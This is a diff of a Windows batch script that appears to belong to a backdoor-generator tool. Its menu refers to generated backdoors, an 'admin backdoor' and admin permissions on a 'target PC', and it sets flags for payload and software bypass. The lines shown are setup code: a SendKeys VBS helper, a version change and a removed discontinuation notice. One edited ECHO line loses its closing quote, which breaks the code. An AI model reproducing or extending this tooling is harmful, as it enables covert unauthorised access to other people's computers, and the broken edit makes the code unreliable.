@@ -1,7 +1,7 @@
 :: setup
 :start
 @ECHO OFF
-set update_number=V4.42.34
+set update_number=V4.40.27
 set dev=0
 cls
 :VBSDynamicBuild
@@ -9,7 +9,7 @@ SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
 IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
 ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
 ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
-ECHO WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%"
+ECHO WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%
 ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
 set temp=0&set autofullscreen=true&set updatelogs=true&set debug_enabled=false&set antivirus=true&set progress_bar=true&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=false
 if not exist C:\ProgramData\autofullscreen.sav echo true>C:\ProgramData\autofullscreen.sav
@@ -65,8 +65,6 @@ if %username% equ kiran if not exist C:\users\%username%\EPbot_installed.sav got
 :EP_finish
 :: manual configuration
   :exit_menu
-  echo [45mfree version is discontinued as of 30/08/2021, it will not recieve any updates
-  echo.
   echo [33myou are using the free version, any backdoor generated will automaticaly be removed after 1 month[0m
   echo [31madmin backdoor needs more testing, use this at your own risk[0m
   echo do you have admin permissions on the target PC?
